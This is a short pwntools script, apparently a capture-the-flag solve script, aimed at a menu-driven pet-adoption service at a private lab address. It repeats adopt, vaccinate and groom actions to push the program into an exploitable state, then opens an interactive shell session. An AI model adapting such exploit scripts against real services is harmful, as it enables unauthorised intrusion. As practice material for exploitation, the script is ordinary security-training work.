from pwn import *

s = remote('192.168.33.10',1234)
def adopt(_type, _gender):
  s.recvuntil('>>')
  s.sendline('1')
  s.recvuntil('>>')
  s.sendline(str(_type))
  s.recvuntil('>>')
  s.sendline(str(_gender))

def vacc_3(index,first,second):
  s.recvuntil('>>')
  s.sendline('3')
  s.recvuntil('>>')
  s.sendline(str(index))
  s.recvuntil('>>')
  s.sendline(str(first))
  s.recvuntil('>>')
  s.sendline(str(second))

def groom_3(index,style):
  s.recvuntil('>>')
  s.sendline('4')
  s.recvuntil('>>')
  s.sendline(str(index))
  s.recvuntil('>>')
  s.sendline(str(style))

adopt(3,0)
adopt(1,1)
vacc_3(1,123,123)
for i in range(0,0x15):
  groom_3(1,1)

adopt(2,0)
s.interactive()
